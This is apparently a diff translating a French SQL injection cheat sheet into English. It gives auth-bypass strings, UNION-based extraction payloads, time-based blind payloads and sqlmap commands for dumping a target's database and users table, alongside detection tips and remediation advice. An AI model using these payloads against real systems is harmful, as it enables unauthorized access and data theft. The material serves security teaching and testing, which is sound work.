@@ -10,32 +10,32 @@ last_updated: 2024-01-01
 
 ## 📖 Description
 
-> Injection de code SQL malveillant dans un champ de saisie pour manipuler la base de données sous-jacente. Permet de contourner l'authentification, extraire des données, ou exécuter des commandes.
+> Injection of malicious SQL code into an input field to manipulate the underlying database. Can bypass authentication, extract data, or execute commands.
 
-**OWASP :** A03:2021 — Injection  
-**CVSS Score moyen :** 9.8 (Critical)
+**OWASP:** A03:2021 — Injection  
+**Average CVSS Score:** 9.8 (Critical)
 
 ---
 
-## 🔬 Mécanisme
+## 🔬 Mechanism
 
-La requête SQL légitime :
+The legitimate SQL query:
 ```sql
 SELECT * FROM users WHERE username='alice' AND password='1234'
 ```
 
-Avec injection `' OR 1=1 --` dans le champ username :
+With injection `' OR 1=1 --` in the username field:
 ```sql
 SELECT * FROM users WHERE username='' OR 1=1 --' AND password='1234'
 ```
-→ 1=1 est toujours vrai → retourne tous les users → bypass auth
+→ 1=1 is always true → returns all users → auth bypass
 
 ---
 
-## 🎯 Détection
+## 🎯 Detection
 
 ```
-# Test basique — ajouter un ' et observer l'erreur
+# Basic test — add a ' and observe the error
 '
 ''
 `
@@ -49,7 +49,7 @@ SELECT * FROM users WHERE username='' OR 1=1 --' AND password='1234'
 \\
 ```
 
-Erreurs révélatrices :
+Revealing errors:
 - `You have an error in your SQL syntax`
 - `Unclosed quotation mark`
 - `ORA-01756` (Oracle)
@@ -67,20 +67,20 @@ admin'--
 ' OR 1=1#
 ```
 
-### UNION-Based (extraction de données)
+### UNION-Based (data extraction)
 
 ```sql
-# Trouver le nombre de colonnes
+# Find the number of columns
 ' ORDER BY 1--
 ' ORDER BY 2--
 ' UNION SELECT NULL--
 ' UNION SELECT NULL,NULL--
 
-# Extraire des données
+# Extract data
 ' UNION SELECT username,password FROM users--
 ```
 
-### Blind SQLi (basé sur le temps)
+### Blind SQLi (time-based)
 
 ```sql
 # MySQL
@@ -91,34 +91,34 @@ admin'--
 '; WAITFOR DELAY '0:0:5'--
 ```
 
-### Avec SQLMap (automatisé)
+### With SQLMap (automated)
 
 ```bash
-# Test basique
+# Basic test
 sqlmap -u "http://target.com/page?id=1"
 
-# Dump de la base de données
+# Dump the database
 sqlmap -u "http://target.com/page?id=1" --dbs
 sqlmap -u "http://target.com/page?id=1" -D dbname --tables
 sqlmap -u "http://target.com/page?id=1" -D dbname -T users --dump
 
-# Avec cookie de session
+# With session cookie
 sqlmap -u "http://target.com/page" --cookie="SESSID=xxx" --data="id=1"
 ```
 
 ---
 
-## 🛡️ Remédiation
+## 🛡️ Remediation
 
-- **Requêtes préparées (paramétrisées)** — séparer les données du code SQL
-- **ORM** — utiliser des frameworks qui abstraient les requêtes
-- **Validation des entrées** — whitelist des caractères autorisés
-- **Principe du moindre privilège** — compte DB avec droits minimaux
-- **WAF** — Web Application Firewall comme couche supplémentaire
+- **Prepared statements (parameterised queries)** — separate data from SQL code
+- **ORM** — use frameworks that abstract queries
+- **Input validation** — whitelist allowed characters
+- **Least privilege principle** — DB account with minimal rights
+- **WAF** — Web Application Firewall as an additional layer
 
 ---
 
-## 🔗 Ressources
+## 🔗 Resources
 
 - [PortSwigger SQLi Labs](https://portswigger.net/web-security/sql-injection)
 - [PayloadsAllTheThings — SQLi](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
